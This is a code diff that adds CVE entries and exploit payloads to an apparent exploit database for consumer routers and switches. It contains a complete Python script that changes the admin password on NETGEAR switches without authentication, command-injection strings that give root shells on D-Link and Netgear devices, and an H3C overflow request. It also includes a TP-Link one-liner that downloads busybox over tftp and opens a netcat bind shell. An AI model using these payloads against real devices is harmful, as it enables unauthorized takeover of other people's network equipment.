@@ -2502,3 +2502,222 @@ Connection: close
  """
  ]
 }
+
+
+model_exp_dic["Netgear_GS110TPv3"] = {
+    "CVE-2021-40866":
+["Certain NETGEAR smart switches are affected by a remote admin password change by an unauthenticated attacker via the (disabled by default) /sqfs/bin/sccd daemon, which fails to check authentication when the authentication TLV is missing from a received NSDP packet. This affects GC108P before 1.0.8.2, GC108PP before 1.0.8.2, GS108Tv3 before 7.0.7.2, GS110TPP before 7.0.7.2, GS110TPv3 before 7.0.7.2, GS110TUP before 1.0.5.3, GS308T before 1.0.3.2, GS310TP before 1.0.3.2, GS710TUP before 1.0.5.3, GS716TP before 1.0.4.2, GS716TPP before 1.0.4.2, GS724TPP before 2.0.6.3, GS724TPv2 before 2.0.6.3, GS728TPPv2 before 6.0.8.2, GS728TPv2 before 6.0.8.2, GS750E before 1.0.1.10, GS752TPP before 6.0.8.2, GS752TPv2 before 6.0.8.2, MS510TXM before 1.0.4.2, and MS510TXUP before 1.0.4.2.\n['https://gynvael.coldwind.pl/?id=740\nhttps://kb.netgear.com/000063978/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Smart-Switches-PSV-2021-0140-PSV-2021-0144-PSV-2021-0145']",
+"""
+#!/usr/bin/python3
+import socket
+from struct import pack, unpack
+import threading
+import time
+import sys
+
+UDP_IP = "192.168.2.14"    # Put target IP here.
+UDP_PORT = 63324
+
+PASSWORD = "AlaMaKota1234"
+
+def db(v):
+  return pack(">B", v)
+
+def dw(v):
+  return pack(">H", v)
+
+def dd(v):
+  return pack(">I", v)
+
+def make_header(
+    cmd,
+    status=0,
+    failure=0,
+    manager_mac=bytes(b"\\1\\1\\1\\1\\1\\1"),
+    agent_mac=bytes(b"\\0\\0\\0\\0\\0\\0"),
+    seq=0,
+):
+  header = [
+    db(1),
+    db(cmd),
+    dw(status),
+    dw(failure),
+    dw(0),
+    manager_mac,
+    agent_mac,
+    dd(seq),
+    b"NSDP",
+    dd(0),
+  ]
+
+  return b"".join(header)
+
+def make_tlv(type, data=b""):
+  d = [
+    dw(type),
+    dw(len(data)),
+    data
+  ]
+  return b''.join(d)
+
+def make_end_tlv():
+  return make_tlv(0xffff);
+
+def encrypt_password(pwd):
+  pwd = bytearray(pwd)
+  super_secret_string = bytearray(b"NtgrSmartSwitchRock")
+
+  for i in range(len(pwd)):
+    pwd[i] ^= super_secret_string[i % len(super_secret_string)]
+
+  return pwd
+
+# Get sequence number.
+if len(sys.argv) != 2:
+  print("usage: python3 nsdp_pwd_chg.py <sequence-number>")
+  print(
+      "Start with sequence-number 1. If it doesn't work, try a higher number.")
+  sys.exit(1)
+
+# Construct the NDSP packet.
+COMMAND_REQ_GET = 1
+COMMAND_REQ_SET = 3
+
+payload = make_header(
+    COMMAND_REQ_SET,
+    seq=int(sys.argv[1])
+)
+
+# TLV Type=10 (password authentication) seems optional :shrug:
+payload += make_tlv(9, encrypt_password(bytes(PASSWORD, "utf-8")))
+payload += make_end_tlv()
+
+# Send the packet.
+print("UDP target IP: %s" % UDP_IP)
+print("UDP target port: %s" % UDP_PORT)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(payload, (UDP_IP, UDP_PORT))
+
+print("Change password packet sent, waiting for response (10 sec)...")
+
+# Wait for reply.
+
+sock.settimeout(10)
+
+try:
+  data, addr = sock.recvfrom(4096)
+
+  # Some heuristics to see if it worked.
+  if len(data) == 38:
+    print(f"IT WORKED! Try it logging in with password: {PASSWORD}")
+  elif len(data) == 32:
+    print("Failed. Maybe SCC Control is disabled?")
+  else:
+    print("No idea, heuristics failed. Try logging in anyway.")
+
+except socket.timeout:
+  print("No response - device not found or sequence number too low.")
+
+sock.close()
+"""
+ ]
+}
+
+model_exp_dic["DWL-2600AP"] = {
+    "CVE-2023-0127":
+["A command injection vulnerability in the firmware_update command, in the device's restricted telnet interface, allows an authenticated attacker to execute arbitrary commands as root.\n'https://www.tenable.com/security/research/tra-2023-1'",
+ """
+An authenticated user can exploit a command injection vulnerability in the firmware-upgrade command in the restricted shell that the D-Link access point exposes over telnet, ssh, and console connections, and thereby obtain a full root busybox (ash) shell on the device. This can be done by passing the string \\$\\(ANY_COMMAND\\ \\&\\>2\\) as an argument, where ANY_COMMAND is a shell command with spaces and special characters escaped, and \&\>2 serves to redirect output to standard error, making it visible to the attacker.
+telnet ip 
+admin
+passwd
+DLINK-WLAN-AP# firmware-upgrade \$\(ANY_COMMAND\ \&\>2\)
+ """
+ ]
+}
+
+model_exp_dic["DI-713P"] = {
+    "CVE-2022-36785":
+['D-Link-G integrated Access Device4 Information Disclosure & Authorization Bypass. *Information Disclosure – file contains a URL with private IP at line 15 "login.asp" A. The window.location.href = http://192.168.1.1/setupWizard.asp" http://192.168.1.1/setupWizard.asp" ; "admin" - contains default username value "login.asp" B. While accessing the web interface, the login form at *Authorization Bypass - URL by "setupWizard.asp\' while it blocks direct access to - the web interface does not properly validate user identity variables values located at the client side, it is available to access it without a "login_glag" and "login_status" checking browser and to read the admin user credentials for the web interface.\n',
+ """
+ """
+ ]
+}
+
+model_exp_dic["H3C_B5_Mini"] = {
+    "CVE-2022-36474":
+["H3C B5 Mini B5MiniV100R005 was discovered to contain a stack overflow via the function WlanWpsSet.\n['https://github.com/Darry-lang1/vuln/blob/main/H3C/H3C%20B5Mini/9/readme.md']",
+ """
+#this is auth stackoverflow , Similar to these and many more 
+#https://github.com/Darry-lang1/vuln/tree/main/H3C/H3C%20B5Mini/
+POST /goform/aspForm HTTP/1.1
+Host: 192.168.0.124:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: https://121.226.152.63:8443/router_password_mobile.asp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 536
+Origin: https://192.168.0.124:80
+DNT: 1
+Connection: close
+Cookie: LOGIN_PSD_REM_FLAG=0; PSWMOBILEFLAG=true
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+CMD=SetMacAccessMode&param="a"*0x100;
+ """
+ ]
+}
+
+model_exp_dic["TL-SG105PE_V1"] = {
+    "CVE-2023-22303":
+["TP-Link SG105PE firmware prior to 'TL-SG105PE(UN) 1.0_1.0.0 Build 20221208' contains an authentication bypass vulnerability. Under the certain conditions, an attacker may impersonate an administrator of the product. As a result, information may be obtained and/or the product's settings may be altered with the privilege of the administrator.\n['https://jvn.jp/en/jp/JVN78481846/index.html'\n'https://www.tp-link.com/jp/support/download/tl-sg105pe/v1/#Firmware']",
+ """
+ """
+ ]
+}
+
+model_exp_dic["Nighthawk_RAX43"] = {
+    "CVE-2021-20167":
+['Netgear RAX43 version 1.0.3.96 contains a command injection vulnerability. The readycloud cgi application is vulnerable to command injection in the name parameter.["https://www.tenable.com/security/research/tra-2021-55"]',
+ '''
+POST /cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users HTTP/1.1
+Content-Length: 49
+ '''],
+    "CVE-2021-20168":
+['Netgear RAX43 version 1.0.3.96 does not have sufficient protections to the UART interface. A malicious actor with physical access to the device is able to connect to the UART port via a serial connection, login with default credentials, and execute commands as the root user. These default credentials are admin:admin.\n["https://www.tenable.com/security/research/tra-2021-55"]',
+ """
+ """
+ ]
+}
+
+
+model_exp_dic['Netgear_RAX30'] = {
+    'CVE-2023-28338':
+["Any request send to a Netgear Nighthawk Wifi6 Router (RAX30)'s web service containing a “Content-Type” of “multipartboundary=” will result in the request body being written to “/tmp/mulipartFile” on the device itself. A sufficiently large file will cause device resources to be exhausted, resulting in the device becoming unusable until it is rebooted.\n['https://drupal9.tenable.com/security/research/tra-2023-12']",
+ """
+ """
+ ]
+}
+
+
+model_exp_dic["TL-MR3020_V1"] = {
+    "CVE-2023-27078":
+["A command injection issue was found in TP-Link MR3020 v.1_150921 that allows a remote attacker to execute arbitrary commands via a crafted request to the tftp endpoint.\n['https://github.com/B2eFly/Router/blob/main/TPLINK/MR3020/1.md']",
+ """
+#help:
+#set you ip 192.168.0.100 
+#sudo service tftp-hpa restart
+#mv CVE-2023-27078 nart.out
+#retstart router
+#!/bin/sh  
+tftp -g 192.168.0.100 -r busybox -l /tmp/busybox;chmod +x /tmp/busybox;/tmp/busybox nc -lvp 8888 -e /bin/sh
+ """
+ ]
+}
